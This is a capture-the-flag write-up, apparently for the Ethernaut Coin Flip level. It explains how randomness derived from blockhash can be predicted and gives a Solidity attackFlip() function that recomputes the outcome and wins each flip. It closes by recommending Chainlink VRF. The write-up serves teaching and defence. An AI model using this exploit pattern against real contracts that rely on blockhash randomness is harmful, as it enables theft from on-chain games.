### Challenge:
-  Guess the correct outcome 10 times in a row.

### Vulnerability:
- Weak Source of Randomness.

### Solution:
- As we know all the things i.e `blockhash`& FACTOR etc, that is being used to generate a random variable. We can run the same script to guess the correct output and call the `flip()` 10 times to pass this level.
```solidity
  function attackFlip() public returns(bool) {
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coin_Flip = blockValue / FACTOR;
    bool side = coin_Flip == 1 ? true : false;

    coinFlip.flip(side);

    return side;
  }
```
PS: This level will test your patience level xD

### Takeaway:
- We should not use Insecure Sources for Randomness i.e `block.timestamp`& `blockhash` etc. Everything we use in smart contracts is publicly visible.
- To get cryptographically proven random numbers/variables, we should use oracles like  Chainlink (Chainlink VRF)

### Useful Resource:
- [Insecure Source of Randomness](https://youtu.be/8FF3IBTMeK0)
